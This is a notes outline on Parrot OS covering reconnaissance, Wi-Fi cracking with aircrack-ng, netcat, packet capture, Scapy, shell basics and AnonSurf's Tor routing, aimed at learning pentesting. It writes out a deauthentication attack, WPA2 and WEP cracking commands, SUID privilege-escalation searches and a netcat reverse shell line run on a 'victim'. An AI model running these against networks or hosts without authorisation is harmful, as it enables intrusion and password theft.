	- ## Network Reconnaissance
		- ```bash
		  # Interface management
		  ip addr show                        # all interfaces
		  ip link show                        # link layer
		  ip route show                       # routing table
		  iwconfig                            # wireless interfaces
		  iwlist wlan0 scan                   # scan for WiFi networks
		  
		  # Port scanning
		  nmap -sS -p- 192.168.1.0/24        # full SYN scan on subnet
		  masscan -p1-65535 192.168.1.0/24 --rate=1000  # fast scanner
		  
		  # Service enumeration
		  nmap -sV -sC 192.168.1.100          # version + default scripts
		  ```
	- ## Aircrack-ng Suite (Wireless)
		- ```bash
		  # Check wireless interfaces
		  iwconfig
		  airmon-ng                           # list wireless interfaces
		  
		  # Kill interfering processes
		  sudo airmon-ng check kill
		  
		  # Enable monitor mode
		  sudo airmon-ng start wlan0          # → wlan0mon
		  
		  # Scan networks
		  sudo airodump-ng wlan0mon
		  
		  # Target specific network
		  sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
		  
		  # Deauthentication attack (capture WPA handshake)
		  sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
		  
		  # Crack WPA2
		  aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
		  
		  # WEP cracking
		  sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon  # ARP replay
		  aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
		  
		  # Restore managed mode
		  sudo airmon-ng stop wlan0mon
		  sudo systemctl restart NetworkManager
		  ```
	- ## Kismet — Wireless Network Detector
		- ```bash
		  # Install
		  sudo apt install kismet -y
		  
		  # Launch (web interface at http://localhost:2501)
		  sudo kismet -c wlan0
		  
		  # Kismet detects:
		  # - WiFi networks (including hidden SSIDs)
		  # - Bluetooth devices
		  # - Zigbee/Z-Wave (with hardware)
		  # - Drone/UAV signals
		  # - Saves pcap files for analysis
		  ```
	- ## Netcat & Ncat
		- ```bash
		  # Netcat — the "Swiss Army knife" of networking
		  # Listen on port
		  nc -lvnp 4444                       # listen for connection
		  
		  # Connect to host
		  nc 192.168.1.100 4444
		  
		  # File transfer
		  # Receiver:
		  nc -lvnp 4444 > received_file.txt
		  # Sender:
		  nc 192.168.1.100 4444 < file_to_send.txt
		  
		  # Reverse shell (on victim)
		  nc -e /bin/bash 192.168.1.50 4444
		  
		  # Port scanning
		  nc -zv 192.168.1.100 20-80
		  
		  # Ncat (improved netcat from Nmap project)
		  ncat -lvnp 4444 --ssl                # SSL listener
		  ncat --broker -lvnp 4444             # connection broker
		  ```
	- ## tcpdump — CLI Packet Capture
		- ```bash
		  # Capture on interface
		  sudo tcpdump -i eth0                 # all traffic
		  sudo tcpdump -i eth0 -w capture.pcap # save to file
		  sudo tcpdump -r capture.pcap         # read pcap
		  
		  # Filters
		  sudo tcpdump -i eth0 host 192.168.1.100
		  sudo tcpdump -i eth0 port 80
		  sudo tcpdump -i eth0 'tcp port 443'
		  sudo tcpdump -i eth0 'src 192.168.1.100 and dst port 80'
		  sudo tcpdump -i eth0 -A port 80      # ASCII output (HTTP)
		  sudo tcpdump -i eth0 -X port 80      # hex + ASCII
		  ```
	- ## Scapy — Packet Crafting
		- ```python
		  # Launch Scapy
		  # sudo scapy
		  
		  from scapy.all import *
		  
		  # Craft and send a packet
		  pkt = IP(dst="192.168.1.1")/ICMP()
		  send(pkt)
		  
		  # TCP SYN packet
		  pkt = IP(dst="192.168.1.100")/TCP(dport=80, flags="S")
		  response = sr1(pkt, timeout=2)
		  
		  # ARP request
		  arp = ARP(pdst="192.168.1.0/24")
		  answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp, timeout=2)
		  for sent, received in answered:
		      print(f"{received.psrc} → {received.hwsrc}")
		  
		  # Sniff packets
		  sniff(iface="eth0", count=10, prn=lambda x: x.summary())
		  ```
- # Shell & Terminal
  collapsed:: true
	- ## Default Shell: Bash (Security) / zsh (optional)
		- Parrot Security uses **bash** by default, but **zsh** with Oh My Zsh is popular in the community.
		- ```bash
		  echo $SHELL              # current shell
		  cat /etc/shells          # available shells
		  chsh -s /bin/zsh         # switch to zsh
		  chsh -s /bin/fish        # switch to fish
		  
		  # Install zsh + Oh My Zsh
		  sudo apt install zsh -y
		  sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
		  
		  # Install fish shell
		  sudo apt install fish -y
		  ```
	- ## Essential Commands
		- ```bash
		  # ── NAVIGATION ──────────────────────────────────────────
		  pwd && ls -la            # where am I + what's here
		  cd /opt/tools            # change directory
		  cd -                     # previous directory
		  pushd /tmp && popd       # directory stack
		  
		  # ── FILE OPERATIONS ─────────────────────────────────────
		  cp -r src/ dest/         # copy recursively
		  mv file.txt /tmp/        # move/rename
		  rm -rf dir/              # remove recursively
		  find / -name "*.conf" 2>/dev/null   # find files
		  find / -perm -4000 2>/dev/null      # find SUID files (privesc!)
		  locate passwd            # fast file search (updatedb first)
		  
		  # ── TEXT PROCESSING ─────────────────────────────────────
		  grep -r "password" /etc/ 2>/dev/null
		  grep -i "admin" users.txt
		  awk -F: '{print $1}' /etc/passwd    # print usernames
		  sed 's/old/new/g' file.txt          # replace text
		  cut -d: -f1,3 /etc/passwd           # cut fields
		  sort -u ips.txt                     # sort + unique
		  uniq -c sorted.txt                  # count duplicates
		  
		  # ── NETWORK QUICK CHECKS ────────────────────────────────
		  ip addr                  # my IPs
		  ss -tulnp                # listening ports
		  curl ifconfig.me         # public IP
		  curl -s https://check.torproject.org | grep -i "congratulations"
		  ```
	- ## Useful Aliases for Pentesters
		- ```bash
		  # Add to ~/.bashrc or ~/.zshrc
		  alias myip='curl -s ifconfig.me'
		  alias torip='curl -s https://check.torproject.org/api/ip'
		  alias ports='ss -tulnp'
		  alias update='sudo apt update && sudo apt full-upgrade -y'
		  alias parrot-update='sudo parrot-upgrade'
		  alias anon='anonsurf start'
		  alias deanon='anonsurf stop'
		  alias scan='nmap -sV -sC'
		  alias msfstart='sudo msfdb start && msfconsole'
		  ```
	- ## Terminal Multiplexer: tmux
		- ```bash
		  # Install
		  sudo apt install tmux -y
		  
		  # Essential tmux commands (prefix = Ctrl+B)
		  tmux new -s pentest          # new session named "pentest"
		  tmux attach -t pentest       # attach to session
		  tmux ls                      # list sessions
		  
		  # Inside tmux:
		  # Ctrl+B c    → new window
		  # Ctrl+B n    → next window
		  # Ctrl+B %    → split vertical
		  # Ctrl+B "    → split horizontal
		  # Ctrl+B d    → detach session
		  # Ctrl+B [    → scroll mode (q to exit)
		  ```
- # AnonSurf Deep Dive
  collapsed:: true
	- ## What is AnonSurf?
		- **AnonSurf** is Parrot's custom tool that routes **all system network traffic through the Tor anonymity network** using iptables rules.
		- It's not just a browser proxy — it affects every application on the system: browsers, terminals, tools, everything.
		- Developed by the Parrot/Frozenbox team specifically for Parrot OS.
	- ## How AnonSurf Works
		- ```mermaid
		  flowchart TD
		      subgraph Normal["🌐 Normal Mode"]
		          A1[Your App] --> B1[System Network Stack]
		          B1 --> C1[ISP]
		          C1 --> D1[Internet]
		          D1 --> E1[Target Server]
		          style Normal fill:#ffcccc,stroke:#cc0000
		      end
		  
		      subgraph AnonMode["🔒 AnonSurf Mode"]
		          A2[Your App] --> B2[iptables rules\nredirect ALL traffic]
		          B2 --> C2[Tor SOCKS proxy\n127.0.0.1:9050]
		          C2 --> D2[Tor Entry Node\nencrypted]
		          D2 --> E2[Tor Middle Node\nencrypted]
		          E2 --> F2[Tor Exit Node]
		          F2 --> G2[Target Server\nsees Exit Node IP]
		          style AnonMode fill:#ccffcc,stroke:#006600
		      end
		  ```
	- ## AnonSurf Under the Hood
		- ```bash
		  # AnonSurf uses iptables to redirect traffic
		  # When you run 'anonsurf start', it does roughly:
		  
		  # 1. Start Tor service
		  sudo systemctl start tor
		  
		  # 2. Flush existing iptables rules
		  sudo iptables -F
		  sudo iptables -t nat -F
		  
		  # 3. Allow loopback
		  sudo iptables -A OUTPUT -o lo -j ACCEPT
		  
		  # 4. Allow Tor process itself
		  sudo iptables -A OUTPUT -m owner --uid-owner debian-tor -j ACCEPT
		  
		  # 5. Block all non-Tor traffic (DNS, TCP)
		  sudo iptables -A OUTPUT -p udp --dport 53 -j REJECT
		  sudo iptables -A OUTPUT -p tcp --dport 53 -j REJECT
		  
		  # 6. Redirect DNS to Tor's DNS port
		  sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 5353
		  
		  # 7. Redirect all TCP to Tor's TransPort
		  sudo iptables -t nat -A OUTPUT -p tcp --syn -j REDIRECT --to-ports 9040
		  
		  # 8. Block everything else
		  sudo iptables -A OUTPUT -j REJECT
		  ```
	- ## AnonSurf Commands
		- ```bash
		  # Start anonymous mode
		  anonsurf start
		  
		  # Stop anonymous mode (restore normal networking)
		  anonsurf stop
		  
		  # Check status
		  anonsurf status
		  
		  # Show current IP (should be a Tor exit node)
		  anonsurf myip
		  
		  # Get a new Tor circuit (new exit IP)
		  anonsurf change
		  
		  # Restart AnonSurf
		  anonsurf restart
		  
		  # Check if Tor is working
		  curl -s https://check.torproject.org/api/ip
		  # Should return: {"IsTor":true,"IP":"x.x.x.x"}
		  ```
	- ## DNS Leak Prevention
		- ```bash
		  # AnonSurf redirects DNS through Tor to prevent DNS leaks
		  # Verify no DNS leaks:
		  
		  # Check DNS resolution goes through Tor
		  dig +short myip.opendns.com @resolver1.opendns.com
		  # Should return Tor exit node IP, not your real IP
		  
		  # Test at: https://dnsleaktest.com (via Tor Browser)
		  
		  # /etc/tor/torrc — Tor configuration
		  sudo vim /etc/tor/torrc
		  ```
		- ```ini
		  # /etc/tor/torrc — key settings for AnonSurf
		  VirtualAddrNetworkIPv4 10.192.0.0/10
		  AutomapHostsOnResolve 1
		  TransPort 9040
		  DNSPort 5353
		  SocksPort 9050
		  ```
	- ## AnonSurf Limitations
		- > [!warning] AnonSurf does NOT make you 100% anonymous. Understand these limitations:
		- **Browser fingerprinting** — your browser's unique fingerprint can identify you even through Tor. Use Tor Browser, not regular Firefox.
		- **JavaScript** — JS can reveal your real IP. Disable JS or use Tor Browser's "Safest" mode.
		- **Logged-in accounts** — if you log into Google/Facebook through Tor, you're identified.
		- **Tor exit node surveillance** — exit nodes can see unencrypted traffic. Always use HTTPS.
		- **Timing attacks** — sophisticated adversaries can correlate traffic timing.
		- **Non-TCP protocols** — some protocols may bypass Tor (UDP is blocked, not routed).
		- **Malware** — if your system is compromised, AnonSurf won't help.
		- **Metadata** — files you share may contain identifying metadata (use MAT2).
- # Parrot Home Edition
  collapsed:: true
	- ## What is Parrot Home?
		- **Parrot Home** is a separate edition of Parrot OS designed for **everyday use** — it includes privacy tools but **none of the offensive security/pentesting tools**.
		- Think of it as a privacy-hardened, lightweight Linux desktop for people who want anonymity and security without the full pentesting toolkit.
		- Perfect for: journalists, activists, privacy-conscious users, developers who want a clean but secure desktop.
	- ## Parrot Home vs Parrot Security
		- | Feature | Parrot Home | Parrot Security |
		  |---------|-------------|-----------------|
		  | AnonSurf | ✅ Yes | ✅ Yes |
		  | Tor Browser | ✅ Yes | ✅ Yes |
		  | MAT2 | ✅ Yes | ✅ Yes |
		  | Firejail | ✅ Yes | ✅ Yes |
		  | KeePassXC | ✅ Yes | ✅ Yes |
		  | Metasploit | ❌ No | ✅ Yes |
		  | Nmap | ❌ No | ✅ Yes |
		  | Aircrack-ng | ❌ No | ✅ Yes |
		  | Wireshark | ❌ No | ✅ Yes |
		  | Ghidra | ❌ No | ✅ Yes |
		  | RAM usage | ~300 MB | ~400 MB |
		  | Disk space | ~8 GB | ~16 GB |
		  | Target user | Daily driver | Security professional |
	- ## MATE Desktop Environment
		- Parrot Home uses **MATE** — a lightweight, traditional desktop environment forked from GNOME 2.
		- ```bash
		  # MATE is fast, customizable, and runs well on older hardware
		  # Key MATE applications:
		  # Caja          → file manager
		  # Pluma         → text editor
		  # Eye of MATE   → image viewer
		  # Atril         → document viewer
		  # MATE Terminal → terminal emulator
		  
		  # Customize MATE
		  mate-control-center    # system settings
		  mate-tweak             # advanced tweaks
		  
		  # Install additional themes
		  sudo apt install arc-theme papirus-icon-theme -y
		  ```
	- ## Privacy-Focused Daily Workflow
		- ```bash
		  # Morning routine for privacy-conscious users:
		  
		  # 1. Start AnonSurf for anonymous browsing
		  anonsurf start
		  anonsurf myip    # verify Tor exit IP
		  
		  # 2. Launch Tor Browser for sensitive browsing
		  tor-browser
		  
		  # 3. Use Firejail for regular browser
		  firejail --private firefox
		  
		  # 4. Before sharing any files, clean metadata
		  mat2 document.pdf
		  mat2 photo.jpg
		  
		  # 5. Use KeePassXC for all passwords
		  keepassxc
		  
		  # 6. Encrypt sensitive files with VeraCrypt
		  veracrypt
		  
		  # 7. Stop AnonSurf when done
		  anonsurf stop
		  ```
	- ## Installing Security Tools on Parrot Home
		- ```bash
		  # You can install individual security tools on Parrot Home
		  # without switching to the full Security edition
		  
		  # Install Nmap
		  sudo apt install nmap -y
		  
		  # Install Wireshark
		  sudo apt install wireshark -y
		  sudo usermod -aG wireshark $USER
		  
		  # Install Metasploit
		  sudo apt install metasploit-framework -y
		  
		  # Install the full security metapackage
		  sudo apt install parrot-tools-full -y   # installs everything
		  
		  # Or specific tool categories
		  sudo apt install parrot-tools-wireless   # wireless tools
		  sudo apt install parrot-tools-forensic   # forensics tools
		  sudo apt install parrot-tools-reversing  # RE tools
		  ```
- # More Learn
	- ## Official Resources
		- [Parrot OS Official Website](https://parrotsec.org)
		- [Parrot OS Documentation](https://parrotsec.org/docs/)
		- [Parrot OS GitLab](https://gitlab.com/parrotsec)
		- [Parrot OS Community Forum](https://community.parrotsec.org)
		- [Parrot OS Telegram](https://t.me/parrotsec)
		- [Parrot OS Discord](https://discord.gg/parrotsec)
	- ## Key Topics to Explore Next
		- **Tor Network** — how onion routing works, Tor hidden services (.onion)
		- **OPSEC** — operational security practices for investigators and activists
		- **CTF (Capture The Flag)** — practice on HackTheBox, TryHackMe, PicoCTF
		- **Bug Bounty** — responsible disclosure programs (HackerOne, Bugcrowd)
		- **Malware Analysis** — dynamic + static analysis in isolated environments
		- **Network Forensics** — pcap analysis, Zeek/Bro, NetworkMiner
	- ## YouTube Playlists
		- Search: "Parrot OS tutorial" on YouTube
		- Search: "AnonSurf Tor Linux privacy" on YouTube
		- Search: "ethical hacking Parrot OS" on YouTube
		- Search: "digital forensics Linux Autopsy Volatility" on YouTube
	- ## Practice Platforms
		- [HackTheBox](https://hackthebox.com) — Parrot HTB edition is optimized for this
		- [TryHackMe](https://tryhackme.com) — beginner-friendly guided rooms
		- [VulnHub](https://vulnhub.com) — downloadable vulnerable VMs
		- [PicoCTF](https://picoctf.org) — beginner CTF challenges